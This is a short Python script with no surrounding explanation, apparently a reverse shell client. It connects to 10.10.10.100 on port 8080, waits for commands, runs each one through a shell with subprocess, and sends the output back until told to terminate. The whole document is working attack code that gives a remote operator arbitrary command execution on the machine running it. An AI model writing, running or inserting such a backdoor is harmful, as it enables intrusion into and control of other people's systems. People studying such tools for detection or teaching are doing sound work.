import socket                     
import subprocess                 

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    s.connect(('10.10.10.100', 8080))                            
 
    while True:                                                 
        command =  s.recv(1024)                                 
        
        if 'terminate' in command:                  
            s.close()
            break 
        
        else:                                      
            
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  )
            s.send( CMD.stderr.read()  ) 

def main ():
    connect()
main()











